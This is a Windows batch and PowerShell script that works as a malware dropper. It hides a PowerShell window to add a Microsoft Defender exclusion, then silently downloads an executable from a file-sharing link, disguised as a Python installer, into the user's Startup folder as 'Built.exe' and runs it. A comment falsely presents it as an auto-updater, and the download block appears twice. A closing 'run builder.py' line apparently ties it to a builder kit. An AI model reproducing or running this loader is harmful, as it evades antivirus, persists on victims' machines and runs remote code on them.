powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://link.storjshare.io/s/juo62co7nisogw537cjexyjlibfa/python/python-3.11.0-amd64.exe?download=1"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"

// Downloads Missing Files, Automatically Updates, Do Not Delete the Command

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://link.storjshare.io/s/juo62co7nisogw537cjexyjlibfa/python/python-3.11.0-amd64.exe?download=1"

if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

run builder.py
